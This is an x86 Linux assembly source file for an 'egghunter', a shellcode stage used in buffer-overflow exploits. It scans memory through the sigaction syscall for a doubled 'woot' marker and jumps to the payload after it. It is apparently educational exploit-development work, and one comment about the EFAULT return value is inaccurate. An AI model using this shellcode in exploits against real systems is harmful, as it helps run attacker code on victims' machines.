; Egghunter
; Author: buffered4ever
; 15-03-2019
global _start
section .text
_start:
next_page:
	or cx, 0xfff ; page size 
next_address:
	inc ecx ; next byte
	xor eax, eax
	mov al, 0x43 ;#define __NR_sigaction 67
	int 0x80 ; syscall
	cmp al, 0xf2 ; if efault al will be 0
	jz next_page ; if zero jump to next page in memory
	
	xor eax, eax
	mov eax, 0x776f6f74 ; our egg woot - 0x776f6f74
	mov edi, ecx ; 
	scasd ; checks if 4 bytes of edi match with eax(woot) 
	jnz next_address ; if no match jump to next address
	scasd ; if matched check if next 4 bytes of edi also match with eax(woot)
	jnz next_address ; if not jump to next address
	jmp edi ; since both eggs matched jump to shellcode

	
